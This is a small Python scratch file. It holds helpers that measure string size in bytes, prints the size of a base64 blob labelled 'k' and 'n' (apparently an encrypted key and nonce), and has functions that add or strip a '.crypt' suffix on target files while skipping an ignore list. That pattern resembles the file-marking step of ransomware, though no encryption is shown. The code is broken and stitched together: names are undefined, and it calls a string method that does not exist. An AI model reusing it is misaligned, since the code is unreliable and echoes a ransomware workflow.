from sys import getsizeof

def get_size_str_in_bytes(string):
    encoded_bytes = string.encode('utf-8')
    size_in_bytes = len(encoded_bytes)
    
    return size_in_bytes


def sys_size_str_byres(string):
    size_in_bytes = getsizeof(string) - getsizeof("")
    
    return size_in_bytes

stringi = b"{'k': 'DaYhWhEu2i1sF44CpBgDIEkA3AoFw20dJy20EwUw135sNj89c7LCli35yfUpoX3/7eDjZfF0TSSNSw2bkXAReu6H9UJDvRWWDryXI5W2+6ztti5/V1vtU2wzUiTASrqSXQLs5J0S99CLR/YLAEfrQzX3L9wVwl+GSu84LXJOqu5+Fop1lEV9+EUF0ibnk8n5idM7ukdBPCRk+z4r+sJLtu712nZk7XqMoZ+C9vhlrzwT+n9ykBS5P3q1IONth8gWjN1lrOndFgfCLHB2rdwhFqniJ2nmKVg3lou0RFQC4xNjaoe8RvnBdjGV0hnhLv4n1JyZf3EuB2tzkPeDjzSRvg==', 'n': 'wViSIgrx/ko='}"
print(get_size_str_in_bytes(stringi.decode()))

# ADD/REMOVE suffix from file name
def add_file_suffix(target_files):
    for _file in target_files:
        if _file not in IGNORE_FILES:
            rename(_file, f'{_file}.crypt')
    
    return


def rm_file_suffix(target_files):
    for _file in target_files:
        if _file.endswith('.crypt'):
            __file = _file.remove('.crypt')
            rename(_file, __file)